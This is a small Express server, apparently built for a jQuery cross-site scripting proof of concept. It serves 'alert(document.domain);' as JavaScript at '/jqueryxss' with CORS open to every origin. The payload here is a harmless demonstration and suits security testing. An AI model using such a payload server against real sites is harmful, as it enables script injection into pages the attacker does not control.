const express = require('express');
const app = express();
const port = 4000;
const cors = require('cors');

app.use(cors());

app.get('/jqueryxss', (req, res) => {
	// res.set('content-type', 'text/javascript');
	res.writeHead(200, { 'Content-Type': 'text/javascript' });
	res.write('alert(document.domain);')
	res.end()
});

app.listen(port, () => {
  console.log(`listening on port ${port}`);
});
